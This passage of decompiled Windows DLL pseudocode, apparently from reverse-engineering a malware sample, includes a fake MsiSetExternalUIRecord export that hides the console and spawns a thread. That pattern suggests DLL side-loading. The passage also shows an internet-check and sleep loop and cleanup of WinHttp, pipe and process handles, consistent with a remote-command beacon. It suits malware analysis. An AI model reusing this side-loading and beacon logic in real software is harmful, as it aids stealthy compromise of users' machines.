    "  v83.m128i_i64[0] = v85;",
    "  v83.m128i_i64[1] = 15;",
    "  v82 = *v12;",
    "LABEL_32:",
    "  sub_1800032E0((char *)&v82, v87);",
    "  hHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)StartAddress, lpParameter, 0, 0);",
    "  v20 = 1;",
    "  v74 = 1;",
    "  v21 = 0;",
    "  while ( 1 )",
    "  {",
    "    v22 = sub_180002280();",
    "    if ( !v22 )",
    "      break;",
    "    if ( v22 != 1 )",
    "      goto LABEL_71;",
    "    if ( InternetCheckConnectionW((LPCWSTR)L\"http://www.google.com\", 1u, 0) )",
    "    {",
    "      sub_180009C20(&qword_18004C8C0, \"Internet is available.\\n\");",
    "      if ( (_QWORD)v75 == *((_QWORD *)&v75 + 1) )",
    "        break;",
    "      sub_180006D30(v96, *((_QWORD *)&v75 + 1) - 32LL);",
    "      v23 = *((_QWORD *)&v75 + 1);",
    "      v24 = *(_QWORD *)(*((_QWORD *)&v75 + 1) - 8LL);",
    "      if ( v24 > 0xF )",
    "      {",
    "        v25 = *(_QWORD *)(*((_QWORD *)&v75 + 1) - 32LL);",
    "        v26 = v24 + 1;",
    "        if ( v26 >= 0x1000 )",
    "        {",
    "          v26 += 39LL;",
    "          if ( (unsigned __int64)(v25 - *(_QWORD *)(v25 - 8) - 8) > 0x1F )",
    "            goto LABEL_140;",
    "          v25 = *(_QWORD *)(v25 - 8);",
    "        }",
    "        sub_1800116E0(v25, v26);",
    "      }",
    "      *(_QWORD *)(v23 - 16) = 0;",
    "      *(_QWORD *)(v23 - 8) = 15;",
    "      *(_BYTE *)(v23 - 32) = 0;",
    "      *((_QWORD *)&v75 + 1) -= 32LL;",
    "      sub_180003E10((__int64)v92, v96);",
    "      memset(&PipeAttributes, 0, sizeof(PipeAttributes));",
    "      v78 = 0;",
    "      v27 = v92;",
    "      v28 = v92[0];",
    "      v29 = v94;",
    "      if ( v94 > 0xF )",
    "        v27 = (_OWORD *)v92[0];",
    "      v30 = v93;",
    "      if ( v93 > 0x7FFFFFFFFFFFFFFFLL )",
    "        std::vector<void *>::_Xlen();",
    "      if ( v93 > 0xF )",
    "      {",
    "        v31 = v93 | 0xF;",
    "        if ( (v93 | 0xF) > 0x7FFFFFFFFFFFFFFFLL )",
    "        {",
    "          v31 = 0x7FFFFFFFFFFFFFFFLL;",
    "          v32 = 0x8000000000000027uLL;",
    "          goto LABEL_55;",
    "        }",
    "        if ( v31 < 0x16 )",
    "          v31 = 22;",
    "        v33 = v31 + 1;",
    "        if ( v31 == -1 )",
    "        {",
    "          v34 = 0;",
    "        }",
    "        else if ( v33 < 0x1000 )",
    "        {",
    "          v34 = sub_180011714(v33);",
    "        }",
    "        else",
    "        {",
    "          v32 = v31 + 40;",
    "          if ( v31 + 40 < v31 + 1 )",
    "            Concurrency::cancel_current_task();",
    "LABEL_55:",
    "          v35 = sub_180011714(v32);",
    "          v36 = v35;",
    "          if ( !v35 )",
    "            goto LABEL_139;",
    "          v34 = (v35 + 39) & 0xFFFFFFFFFFFFFFE0uLL;",
    "          *(_QWORD *)(v34 - 8) = v36;",
    "        }",
    "        *(_QWORD *)&PipeAttributes.nLength = v34;",
    "        *(_QWORD *)&PipeAttributes.bInheritHandle = v30;",
    "        v78 = v31;",
    "        sub_180036160(v34, v27, v30 + 1);",
    "        goto LABEL_59;",
    "      }",
    "      *(_QWORD *)&PipeAttributes.bInheritHandle = v93;",
    "      v78 = 15;",
    "      *(_OWORD *)&PipeAttributes.nLength = *v27;",
    "LABEL_59:",
    "      sub_1800032E0((char *)&PipeAttributes, v95);",
    "      if ( v78 > 0xF )",
    "      {",
    "        v37 = v78 + 1;",
    "        v38 = *(_QWORD *)&PipeAttributes.nLength;",
    "        if ( v78 + 1 >= 0x1000 )",
    "        {",
    "          v37 = v78 + 40;",
    "          v38 = *(_QWORD *)(*(_QWORD *)&PipeAttributes.nLength - 8LL);",
    "          if ( (unsigned __int64)(*(_QWORD *)&PipeAttributes.nLength - v38 - 8) > 0x1F )",
    "LABEL_139:",
    "            invalid_parameter_noinfo_noreturn();",
    "        }",
    "        sub_1800116E0(v38, v37);",
    "      }",
    "      *(_QWORD *)&PipeAttributes.bInheritHandle = 0;",
    "      v78 = 15;",
    "      LOBYTE(PipeAttributes.nLength) = 0;",
    "      if ( v29 > 0xF )",
    "      {",
    "        v39 = v29 + 1;",
    "        v40 = v28;",
    "        if ( v29 + 1 >= 0x1000 )",
    "        {",
    "          v39 = v29 + 40;",
    "          v28 = *(_QWORD *)(v28 - 8);",
    "          if ( (unsigned __int64)(v40 - v28 - 8) > 0x1F )",
    "LABEL_140:",
    "            invalid_parameter_noinfo_noreturn();",
    "        }",
    "        sub_1800116E0(v28, v39);",
    "      }",
    "      if ( v97 > 0xF )",
    "      {",
    "        v41 = v97 + 1;",
    "        v42 = v96[0];",
    "        if ( v97 + 1 >= 0x1000 )",
    "        {",
    "          v41 = v97 + 40;",
    "          v42 = *(_QWORD *)(v96[0] - 8LL);",
    "          if ( (unsigned __int64)(v96[0] - v42 - 8) > 0x1F )",
    "            invalid_parameter_noinfo_noreturn();",
    "        }",
    "        sub_1800116E0(v42, v41);",
    "      }",
    "LABEL_71:",
    "      if ( byte_18004DE78 )",
    "      {",
    "        Sleep(1000 * dword_18004BCC4);",
    "        if ( v20 )",
    "        {",
    "          v46 = sub_1800109E4();",
    "          v47 = sub_1800109C8();",
    "          if ( v46 == 10000000 )",
    "          {",
    "            v21 = 100 * v47;",
    "          }",
    "          else if ( v46 == 24000000 )",
    "          {",
    "            v21 = 1000000000 * (v47 / 24000000)",
    "                + 1000000000 * (v47 % 24000000) / 24000000",
    "                + 1000000000 * (v47 % 24000000);",
    "          }",
    "          else",
    "          {",
    "            v21 = 1000000000 * (v47 % v46) / v46 + 1000000000 * (v47 / v46);",
    "          }",
    "          v74 = 0;",
    "        }",
    "        v48 = sub_1800109E4();",
    "        v49 = sub_1800109C8();",
    "        if ( v48 == 10000000 )",
    "        {",
    "          v50 = 100 * v49;",
    "        }",
    "        else if ( v48 == 24000000 )",
    "        {",
    "          v50 = 1000000000 * (v49 / 24000000) + 1000000000 * (v49 % 24000000) / 24000000;",
    "        }",
    "        else",
    "        {",
    "          v50 = 1000000000 * (v49 / v48) + 1000000000 * (v49 % v48) / v48;",
    "        }",
    "        if ( (v50 - v21) / 60000000000LL >= dword_18004E018 )",
    "        {",
    "          byte_18004DE78 = 0;",
    "          v74 = 1;",
    "          v51 = sub_180009C20(&qword_18004C8C0, \"10 minutes have passed. Stopping the function.\");",
    "          sub_180009ED0(v51);",
    "        }",
    "        sub_1800021A0(&Value);",
    "        v52 = Value + 1000000000;",
    "        if ( Value >= 0x7FFFFFFFC46535FFLL )",
    "          v52 = 0x7FFFFFFFFFFFFFFFLL;",
    "        while ( 1 )",
    "        {",
    "          v53 = sub_1800109E4();",
    "          v54 = sub_1800109C8();",
    "          if ( v53 == 10000000 )",
    "            v55 = 100 * v54;",
    "          else",
    "            v55 = v53 == 24000000",
    "                ? 1000000000 * (v54 / 24000000) + 1000000000 * (v54 % 24000000) / 24000000",
    "                : 1000000000 * (v54 / v53) + 1000000000 * (v54 % v53) / v53;",
    "          if ( v55 >= v52 )",
    "            break;",
    "          v56 = v52 - v55;",
    "          if ( v52 - v55 < 86400000000000LL )",
    "          {",
    "            v57 = v56 / 1000000;",
    "            if ( 1000000 * (v56 / 1000000) < v56 )",
    "              LODWORD(v57) = v57 + 1;",
    "            Sleep(v57);",
    "          }",
    "          else",
    "          {",
    "            Sleep(0x5265C00u);",
    "          }",
    "        }",
    "        v20 = v74;",
    "      }",
    "      else",
    "      {",
    "        v43 = sub_180009C20(&qword_18004C8C0, \"Sleeping for \");",
    "        v44 = sub_180005E50(v43);",
    "        v45 = sub_180009C20(v44, \" minutes...\");",
    "        sub_180009ED0(v45);",
    "        if ( byte_18004BCCC )",
    "        {",
    "          Sleep(60000 * dword_18004BCC8);",
    "        }",
    "        else",
    "        {",
    "          Sleep(60000 * dword_18004E0F8);",
    "          byte_18004BCCC = 1;",
    "        }",
    "      }",
    "    }",
    "    else",
    "    {",
    "      sub_180009C20(&qword_18004C8C0, \"No internet connection.\\n\");",
    "      byte_18004DE78 = 0;",
    "    }",
    "  }",
    "  CloseHandle((HANDLE)hObject);",
    "  CloseHandle(hWritePipe);",
    "  CloseHandle(lpParameter);",
    "  CloseHandle((HANDLE)qword_18004E188);",
    "  CloseHandle(ProcessInformation);",
    "  CloseHandle(*(&ProcessInformation + 1));",
    "  WinHttpCloseHandle(hRequest);",
    "  WinHttpCloseHandle(hInternet);",
    "  WinHttpCloseHandle(qword_18004E1A8);",
    "  v58 = GetProcessHeap();",
    "  HeapFree(v58, 0, lpMem);",
    "  if ( v83.m128i_i64[1] <= 0xFuLL )",
    "    goto LABEL_108;",
    "  v59 = v83.m128i_i64[1] + 1;",
    "  v60 = v82;",
    "  if ( (unsigned __int64)(v83.m128i_i64[1] + 1) >= 0x1000 )",
    "  {",
    "    v59 = v83.m128i_i64[1] + 40;",
    "    v60 = *(_QWORD *)(v82 - 8);",
    "    if ( (unsigned __int64)(v82 - v60 - 8) > 0x1F )",
    "LABEL_143:",
    "      invalid_parameter_noinfo_noreturn();",
    "  }",
    "  sub_1800116E0(v60, v59);",
    "LABEL_108:",
    "  si128 = _mm_load_si128((const __m128i *)&xmmword_180044B80);",
    "  v83 = si128;",
    "  LOBYTE(v82) = 0;",
    "  if ( v86 > 0xF )",
    "  {",
    "    v62 = v86 + 1;",
    "    v63 = v84[0];",
    "    if ( v86 + 1 < 0x1000",
    "      || (v62 = v86 + 40, v63 = *(_QWORD *)(v84[0] - 8LL), (unsigned __int64)(v84[0] - v63 - 8) <= 0x1F) )",
    "    {",
    "      sub_1800116E0(v63, v62);",
    "      si128 = _mm_load_si128((const __m128i *)&xmmword_180044B80);",
    "      goto LABEL_112;",
    "    }",
    "LABEL_144:",
    "    invalid_parameter_noinfo_noreturn();",
    "  }",
    "LABEL_112:",
    "  if ( v99 > 0xF )",
    "  {",
    "    v64 = v99 + 1;",
    "    v65 = v98[0];",
    "    if ( v99 + 1 >= 0x1000 )",
    "    {",
    "      v64 = v99 + 40;",
    "      v65 = *(_QWORD *)(v98[0] - 8LL);",
    "      if ( (unsigned __int64)(v98[0] - v65 - 8) > 0x1F )",
    "        invalid_parameter_noinfo_noreturn();",
    "    }",
    "    sub_1800116E0(v65, v64);",
    "    v7 = v75;",
    "    goto LABEL_116;",
    "  }",
    "  v7 = v75;",
    "LABEL_117:",
    "  if ( v7 )",
    "  {",
    "    ((void (*)(void))sub_18000ACE0)();",
    "    v66 = v75;",
    "    v67 = (v76 - v75) & 0xFFFFFFFFFFFFFFE0uLL;",
    "    if ( v67 >= 0x1000 )",
    "    {",
    "      v67 += 39LL;",
    "      v66 = *(_QWORD *)(v75 - 8);",
    "      if ( (unsigned __int64)(v75 - v66 - 8) > 0x1F )",
    "        invalid_parameter_noinfo_noreturn();",
    "    }",
    "    sub_1800116E0(v66, v67);",
    "    v75 = 0u;",
    "    v76 = 0;",
    "    si128 = _mm_load_si128((const __m128i *)&xmmword_180044B80);",
    "  }",
    "  if ( v91.m128i_i64[1] > 0xFuLL )",
    "  {",
    "    v68 = v91.m128i_i64[1] + 1;",
    "    v69 = v90;",
    "    if ( (unsigned __int64)(v91.m128i_i64[1] + 1) >= 0x1000 )",
    "    {",
    "      v68 = v91.m128i_i64[1] + 40;",
    "      v69 = *(_QWORD *)(v90 - 8);",
    "      if ( (unsigned __int64)(v90 - v69 - 8) > 0x1F )",
    "        invalid_parameter_noinfo_noreturn();",
    "    }",
    "    sub_1800116E0(v69, v68);",
    "    si128 = _mm_load_si128((const __m128i *)&xmmword_180044B80);",
    "  }",
    "  v91 = si128;",
    "  LOBYTE(v90) = 0;",
    "  if ( (_QWORD)v79 )",
    "  {",
    "    sub_18000ACE0(v79, *((_QWORD *)&v79 + 1));",
    "    v70 = v79;",
    "    v71 = (v80 - v79) & 0xFFFFFFFFFFFFFFE0uLL;",
    "    if ( v71 >= 0x1000 )",
    "    {",
    "      v71 += 39LL;",
    "      v70 = *(_QWORD *)(v79 - 8);",
    "      if ( (unsigned __int64)(v79 - v70 - 8) > 0x1F )",
    "        invalid_parameter_noinfo_noreturn();",
    "    }",
    "    sub_1800116E0(v70, v71);",
    "    v79 = 0;",
    "    v80 = 0;",
    "  }",
    "  if ( *((_QWORD *)&v89 + 1) > 0xFu )",
    "  {",
    "    v72 = *((_QWORD *)&v89 + 1) + 1LL;",
    "    v73 = v88;",
    "    if ( (unsigned __int64)(*((_QWORD *)&v89 + 1) + 1LL) >= 0x1000 )",
    "    {",
    "      v72 = *((_QWORD *)&v89 + 1) + 40LL;",
    "      v73 = *(_QWORD *)(v88 - 8);",
    "      if ( (unsigned __int64)(v88 - v73 - 8) > 0x1F )",
    "        invalid_parameter_noinfo_noreturn();",
    "    }",
    "    sub_1800116E0(v73, v72);",
    "  }",
    "}",
    "",
    "",
    "PCONTEXT __fastcall sub_180004F60(XSAVE_FORMAT *lpThreadParameter)",
    "{",
    "  sub_18001F194(lpThreadParameter);",
    "  sub_1800041C0();",
    "  return 0;",
    "}",
    "",
    "",
    "UINT __stdcall  MsiSetExternalUIRecord(",
    "        INSTALLUI_HANDLER_RECORD puiHandler,",
    "        DWORD dwMessageFilter,",
    "        LPVOID pvContext,",
    "        PINSTALLUI_HANDLER_RECORD ppuiPrevHandler)",
    "{",
    "  FreeConsole();",
    "  CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_180004F60, 0, 0, 0);",
    "  while ( 1 )",
    "    Sleep(0x3E8u);",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180004FD0(__int64 a1, int a2)",
    "{",
    "  if ( a2 == 1 && !CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_180004F80, 0, 0, 0) )",
    "    CloseHandle(0);",
    "  return 1;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180005010(__int64 a1, __int64 a2)",
    "{",
    "  __int64 v3; // rax",
    "",
    "  v3 = sub_180009F60(a2);",
    "  return sub_180008120(a1, v3);",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180005040(_QWORD *a1)",
    "{",
    "  if ( !a1[16] || (*(unsigned int (__fastcall **)(_QWORD *, __int64))(*a1 + 24LL))(a1, 0xFFFFFFFFLL) == -1 )",
    "    return 0;",
    "  else",
    "    return (unsigned int)((int)sub_18001F548(a1[16]) >= 0) - 1;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180005090(__int64 a1, __int64 a2, __int64 a3)",
    "{",
    "  bool v5; // zf",
    "  __int64 v6; // r8",
    "  __int64 v7; // rcx",
    "  __int64 v8; // rdi",
    "  __int64 v9; // rcx",
    "  __int64 v10; // rcx",
    "  __int64 v11; // rcx",
    "  __int64 result; // rax",
    "  __int64 v13; // [rsp+20h] [rbp-38h] BYREF",
    "  __int64 v14; // [rsp+28h] [rbp-30h] BYREF",
    "  __int64 v15; // [rsp+30h] [rbp-28h] BYREF",
    "",
    "  if ( a2 || (v5 = a3 == 0, v6 = 4, !v5) )",
    "    v6 = 0;",
    "  v7 = *(_QWORD *)(a1 + 128);",
    "  if ( !v7 || (unsigned int)sub_18001F6D8(v7, a2, v6, a3) )",
    "    return 0;",
    "  *(_BYTE *)(a1 + 124) = 1;",
    "  *(_QWORD *)(a1 + 24) = a1 + 8;",
    "  *(_QWORD *)(a1 + 32) = a1 + 16;",
    "  *(_QWORD *)(a1 + 56) = a1 + 40;",
    "  *(_QWORD *)(a1 + 64) = a1 + 48;",
    "  *(_QWORD *)(a1 + 80) = a1 + 72;",
    "  *(_QWORD *)(a1 + 88) = a1 + 76;",
    "  *(_BYTE *)(a1 + 113) = 0;",
    "  v8 = *(_QWORD *)(a1 + 128);",
    "  *(_QWORD *)(a1 + 16) = 0;",
    "  *(_QWORD *)(a1 + 48) = 0;",
    "  *(_DWORD *)(a1 + 76) = 0;",
    "  *(_QWORD *)(a1 + 8) = 0;",
    "  *(_QWORD *)(a1 + 40) = 0;",
    "  *(_DWORD *)(a1 + 72) = 0;",
    "  if ( v8 )",
    "  {",
    "    v13 = 0;",
    "    v14 = 0;",
    "    v15 = 0;",
    "    sub_180017428(v8, &v13, &v14, &v15);",
    "    v9 = v13;",
    "    *(_QWORD *)(a1 + 24) = v13;",
    "    *(_QWORD *)(a1 + 32) = v9;",
    "    v10 = v14;",
    "    *(_QWORD *)(a1 + 56) = v14;",
    "    *(_QWORD *)(a1 + 64) = v10;",
    "    v11 = v15;",
    "    *(_QWORD *)(a1 + 80) = v15;",
    "    *(_QWORD *)(a1 + 88) = v11;",
    "  }",
    "  *(_QWORD *)(a1 + 128) = v8;",
    "  result = a1;",
    "  *(_QWORD *)(a1 + 116) = qword_18004E1D8;",
    "  *(_QWORD *)(a1 + 104) = 0;",
    "  return result;",
    "}",
    "",
    "",
    "_QWORD *__fastcall sub_1800051C0(__int64 a1, _QWORD *a2, _QWORD *a3)",
    "{",
    "  bool v5; // zf",
    "  _QWORD *v7; // rcx",
    "  __int64 v8; // rdx",
    "  __int64 v9; // r8",
    "  __int64 v10; // rcx",
    "  fpos_t Position; // [rsp+20h] [rbp-28h] BYREF",
    "",
    "  v5 = *(_QWORD *)(a1 + 128) == 0;",
    "  Position = *a3 + a3[1];",
    "  if ( v5 || !(unsigned __int8)sub_1800081A0() || fsetpos(*(FILE **)(a1 + 128), &Position) )",
    "  {",
    "    *a2 = -1;",
    "    a2[1] = 0;",
    "    a2[2] = 0;",
    "  }",
    "  else",
    "  {",
    "    v7 = *(_QWORD **)(a1 + 24);",
    "    *(_QWORD *)(a1 + 116) = a3[2];",
    "    if ( *v7 == a1 + 112 )",
    "    {",
    "      v8 = *(_QWORD *)(a1 + 136);",
    "      v9 = *(_QWORD *)(a1 + 144);",
    "      *v7 = v8;",
    "      **(_QWORD **)(a1 + 56) = v8;",
    "      **(_DWORD **)(a1 + 80) = v9 - v8;",
    "    }",
    "    v10 = *(_QWORD *)(a1 + 116);",
    "    *a2 = Position;",
    "    a2[2] = v10;",
    "    a2[1] = 0;",
    "  }",
    "  return a2;",
    "}",
    "",
    "",
    "_QWORD *__fastcall sub_1800052A0(__int64 a1, _QWORD *a2, __int64 a3, unsigned int a4)",
    "{",
    "  __int64 v4; // r14",
    "  __int64 v6; // rsi",
    "  _QWORD *v9; // rax",
    "  __int64 v10; // rdx",
    "  __int64 v11; // r8",
    "  __int64 v12; // rcx",
    "  __int64 Position; // [rsp+20h] [rbp-38h] BYREF",
    "",
    "  v4 = a1 + 112;",
    "  v6 = a3;",
    "  if ( **(_QWORD **)(a1 + 56) == a1 + 112 && a4 == 1 && !*(_QWORD *)(a1 + 104) )",
    "    v6 = a3 - 1;",
    "  if ( !*(_QWORD *)(a1 + 128)",
    "    || !(unsigned __int8)sub_1800081A0()",
    "    || (v6 || a4 != 1) && (unsigned int)sub_18001FAB8(*(_QWORD *)(a1 + 128), v6, a4)",
    "    || fgetpos(*(FILE **)(a1 + 128), (#87 *)&Position) )",
    "  {",
    "    *a2 = -1;",
    "    a2[1] = 0;",
    "    a2[2] = 0;",
    "  }",
    "  else",
    "  {",
    "    v9 = *(_QWORD **)(a1 + 24);",
    "    if ( *v9 == v4 )",
    "    {",
    "      v10 = *(_QWORD *)(a1 + 136);",
    "      v11 = *(_QWORD *)(a1 + 144);",
    "      *v9 = v10;",
    "      **(_QWORD **)(a1 + 56) = v10;",
    "      **(_DWORD **)(a1 + 80) = v11 - v10;",
    "    }",
    "    v12 = *(_QWORD *)(a1 + 116);",
    "    *a2 = Position;",
    "    a2[2] = v12;",
    "    a2[1] = 0;",
    "  }",
    "  return a2;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_1800053B0(__int64 a1, unsigned __int8 *a2, __int64 a3)",
    "{",
    "  __int64 v3; // r14",
    "  unsigned __int8 *v4; // r15",
    "  __int64 v6; // rdi",
    "  int **v7; // rsi",
    "  __int64 v8; // rcx",
    "  __int64 v9; // rdx",
    "  __int64 v10; // rbp",
    "  __int64 v13; // r9",
    "  int v14; // ecx",
    "  __int64 v15; // rdi",
    "",
    "  v3 = a3;",
    "  v4 = a2;",
    "  if ( *(_QWORD *)(a1 + 104) )",
    "  {",
    "    v6 = a3;",
    "    if ( a3 > 0 )",
    "    {",
    "      v7 = (int **)(a1 + 88);",
    "      do",
    "      {",
    "        v8 = **(_QWORD **)(a1 + 64);",
    "        if ( v8 && (v9 = **v7, (int)v9 > 0) )",
    "        {",
    "          v10 = v6;",
    "          if ( v6 >= v9 )",
    "            v10 = **v7;",
    "          sub_180036160(v8, v4, v10);",
    "          v6 -= v10;",
    "          **v7 -= v10;",
    "          **(_QWORD **)(a1 + 64) += (int)v10;",
    "        }",
    "        else",
    "        {",
    "          if ( (*(unsigned int (__fastcall **)(__int64, _QWORD))(*(_QWORD *)a1 + 24LL))(a1, *v4) == -1 )",
    "            return v3 - v6;",
    "          --v6;",
    "          v7 = (int **)(a1 + 88);",
    "          v10 = 1;",
    "        }",
    "        v4 += v10;",
    "      }",
    "      while ( v6 > 0 );",
    "    }",
    "    return v3 - v6;",
    "  }",
    "  else",
    "  {",
    "    v13 = **(_QWORD **)(a1 + 64);",
    "    if ( v13 )",
    "      v14 = **(_DWORD **)(a1 + 88);",
    "    else",
    "      v14 = 0;",
    "    v15 = v14;",
    "    if ( a3 > 0 )",
    "    {",
    "      if ( v14 <= 0 )",
    "        goto LABEL_26;",
    "      if ( a3 < v14 )",
    "        v15 = a3;",
    "      sub_180036160(v13, a2, v15);",
    "      v4 += v15;",
    "      v3 -= v15;",
    "      **(_DWORD **)(a1 + 88) -= v15;",
    "      **(_QWORD **)(a1 + 64) += (int)v15;",
    "      if ( v3 > 0 )",
    "      {",
    "LABEL_26:",
    "        if ( *(_QWORD *)(a1 + 128) )",
    "          v3 -= sub_18001FFA8(v4, 1, v3);",
    "      }",
    "    }",
    "    return a3 - v3;",
    "  }",
    "}",
    "",
    "",
    "unsigned __int64 __fastcall sub_1800054F0(__int64 a1, _BYTE *a2, __int64 a3)",
    "{",
    "  __int64 v7; // rdi",
    "  int **v8; // rsi",
    "  __int64 v9; // rdx",
    "  __int64 v10; // rcx",
    "  __int64 v11; // rbp",
    "  int v12; // eax",
    "  unsigned __int64 v14; // rsi",
    "  __int64 v15; // rdx",
    "  int v16; // ecx",
    "  __int64 v17; // rdi",
    "  _QWORD *v18; // r8",
    "  __int64 v19; // rcx",
    "  __int64 v20; // rdx",
    "  __int64 v21; // rax",
    "",
    "  if ( a3 <= 0 )",
    "    return 0;",
    "  if ( *(_QWORD *)(a1 + 104) )",
    "  {",
    "    v7 = a3;",
    "    v8 = (int **)(a1 + 80);",
    "    do",
    "    {",
    "      v9 = **(_QWORD **)(a1 + 56);",
    "      if ( v9 && (v10 = **v8, (int)v10 > 0) )",
    "      {",
    "        v11 = v7;",
    "        if ( v7 >= v10 )",
    "          v11 = **v8;",
    "        sub_180036160(a2, v9, v11);",
    "        v7 -= v11;",
    "        **v8 -= v11;",
    "        **(_QWORD **)(a1 + 56) += (int)v11;",
    "      }",
    "      else",
    "      {",
    "        v12 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 56LL))(a1);",
    "        if ( v12 == -1 )",
    "          return a3 - v7;",
    "        *a2 = v12;",
    "        v8 = (int **)(a1 + 80);",
    "        --v7;",
    "        v11 = 1;",
    "      }",
    "      a2 += v11;",
    "    }",
    "    while ( v7 > 0 );",
    "    return a3 - v7;",
    "  }",
    "  else",
    "  {",
    "    v14 = a3;",
    "    v15 = **(_QWORD **)(a1 + 56);",
    "    if ( v15 )",
    "      v16 = **(_DWORD **)(a1 + 80);",
    "    else",
    "      v16 = 0;",
    "    if ( v16 )",
    "    {",
    "      v17 = a3;",
    "      if ( v16 < (unsigned __int64)a3 )",
    "        v17 = v16;",
    "      sub_180036160(a2, v15, v17);",
    "      a2 += v17;",
    "      v14 = a3 - v17;",
    "      **(_DWORD **)(a1 + 80) -= v17;",
    "      **(_QWORD **)(a1 + 56) += (int)v17;",
    "    }",
    "    if ( *(_QWORD *)(a1 + 128) )",
    "    {",
    "      v18 = *(_QWORD **)(a1 + 24);",
    "      if ( *v18 == a1 + 112 )",
    "      {",
    "        v19 = *(_QWORD *)(a1 + 136);",
    "        v20 = *(_QWORD *)(a1 + 144);",
    "        *v18 = v19;",
    "        **(_QWORD **)(a1 + 56) = v19;",
    "        **(_DWORD **)(a1 + 80) = v20 - v19;",
    "      }",
    "      if ( v14 <= 0xFFF )",
    "      {",
    "LABEL_27:",
    "        if ( v14 )",
    "          v14 -= sub_1800202AC(a2, 1, v14, *(_QWORD *)(a1 + 128));",
    "      }",
    "      else",
    "      {",
    "        while ( 1 )",
    "        {",
    "          v21 = sub_1800202AC(a2, 1, 4095, *(_QWORD *)(a1 + 128));",
    "          a2 += v21;",
    "          v14 -= v21;",
    "          if ( v21 != 4095 )",
    "            break;",
    "          if ( v14 <= 0xFFF )",
    "            goto LABEL_27;",
    "        }",
    "      }",
    "    }",
    "    return a3 - v14;",
    "  }",
    "}",
    "",
    "",
    "__int64 __fastcall sub_1800056A0(__int64 a1)",
    "{",
    "  unsigned __int64 v2; // rcx",
    "  int *v3; // rdx",
    "  __int64 v4; // r9",
    "  _QWORD *v5; // rcx",
    "  unsigned __int8 *v6; // rdx",
    "  _QWORD *v8; // r9",
    "  __int64 v9; // rdx",
    "  __int64 v10; // rcx",
    "  __int64 v11; // rcx",
    "  int v12; // eax",
    "  unsigned int v13; // ebx",
    "  int v14; // eax",
    "  unsigned __int8 v15; // r8",
    "  unsigned __int64 v16; // rcx",
    "  __int128 *v17; // rax",
    "  char *v18; // rdx",
    "  __int128 *v19; // r8",
    "  int v20; // eax",
    "  int v21; // eax",
    "  __int128 *v22; // rax",
    "  unsigned __int64 v23; // r9",
    "  __int128 *v24; // rcx",
    "  unsigned __int64 v25; // rbx",
    "  int v26; // eax",
    "  unsigned __int64 v27; // rdx",
    "  __int64 v28; // rcx",
    "  char *v29; // rax",
    "  __int64 v30; // rcx",
    "  __int64 v31; // rbx",
    "  __int64 v32; // [rsp+40h] [rbp-40h] BYREF",
    "  unsigned __int8 *v33; // [rsp+48h] [rbp-38h] BYREF",
    "  unsigned __int8 v34; // [rsp+50h] [rbp-30h] BYREF",
    "  char v35[7]; // [rsp+51h] [rbp-2Fh] BYREF",
    "  __int128 v36; // [rsp+58h] [rbp-28h] BYREF",
    "  unsigned __int64 v37; // [rsp+68h] [rbp-18h]",
    "  unsigned __int64 v38; // [rsp+70h] [rbp-10h]",
    "",
    "  v2 = **(_QWORD **)(a1 + 56);",
    "  if ( v2 && (v3 = *(int **)(a1 + 80), v4 = *v3, v2 < v2 + v4) )",
    "  {",
    "    *v3 = v4 - 1;",
    "    v5 = *(_QWORD **)(a1 + 56);",
    "    v6 = (unsigned __int8 *)(*v5)++;",
    "    return *v6;",
    "  }",
    "  else if ( *(_QWORD *)(a1 + 128) )",
    "  {",
    "    v8 = *(_QWORD **)(a1 + 24);",
    "    if ( *v8 == a1 + 112 )",
    "    {",
    "      v9 = *(_QWORD *)(a1 + 144);",
    "      v10 = *(_QWORD *)(a1 + 136);",
    "      *v8 = v10;",
    "      **(_QWORD **)(a1 + 56) = v10;",
    "      **(_DWORD **)(a1 + 80) = v9 - v10;",
    "    }",
    "    v11 = *(_QWORD *)(a1 + 128);",
    "    if ( *(_QWORD *)(a1 + 104) )",
    "    {",
    "      v36 = 0;",
    "      v37 = 0;",
    "      v38 = 15;",
    "      LOBYTE(v36) = 0;",
    "      v14 = sub_18001E1B0(v11);",
    "      v15 = v14;",
    "      if ( v14 == -1 )",
    "      {",
    "LABEL_31:",
    "        v13 = -1;",
    "      }",
    "      else",
    "      {",
    "        while ( 1 )",
    "        {",
    "          v16 = v37;",
    "          if ( v37 >= v38 )",
    "          {",
    "            sub_18000AD70(&v36, 1, 0, v15);",
    "          }",
    "          else",
    "          {",
    "            ++v37;",
    "            v17 = &v36;",
    "            if ( v38 > 0xF )",
    "              v17 = (__int128 *)v36;",
    "            *((_BYTE *)v17 + v16) = v15;",
    "            *((_BYTE *)v17 + v16 + 1) = 0;",
    "          }",
    "          v18 = (char *)&v36;",
    "          if ( v38 > 0xF )",
    "            v18 = (char *)v36;",
    "          v19 = &v36;",
    "          if ( v38 > 0xF )",
    "            v19 = (__int128 *)v36;",
    "          v20 = (*(__int64 (__fastcall **)(_QWORD, __int64, __int128 *, char *, __int64 *, unsigned __int8 *, char *, unsigned __int8 **))(**(_QWORD **)(a1 + 104) + 48LL))(",
    "                  *(_QWORD *)(a1 + 104),",
    "                  a1 + 116,",
    "                  v19,",
    "                  &v18[v37],",
    "                  &v32,",
    "                  &v34,",
    "                  v35,",
    "                  &v33);",
    "          if ( v20 )",
    "          {",
    "            v21 = v20 - 1;",
    "            if ( v21 )",
    "              break;",
    "          }",
    "          v22 = &v36;",
    "          if ( v33 != &v34 )",
    "          {",
    "            if ( v38 > 0xF )",
    "              v22 = (__int128 *)v36;",
    "            v30 = v32;",
    "            v31 = (__int64)v22 + v37 - v32;",
    "            if ( v31 > 0 )",
    "            {",
    "              while ( 1 )",
    "              {",
    "                sub_18001E5FC((unsigned int)*(char *)(--v31 + v30), *(_QWORD *)(a1 + 128));",
    "                if ( v31 <= 0 )",
    "                  break;",
    "                v30 = v32;",
    "              }",
    "            }",
    "            v13 = v34;",
    "            goto LABEL_32;",
    "          }",
    "          if ( v38 > 0xF )",
    "            v22 = (__int128 *)v36;",
    "          v23 = v32 - (_QWORD)v22;",
    "          if ( v37 < v32 - (__int64)v22 )",
    "            v23 = v37;",
    "          v24 = &v36;",
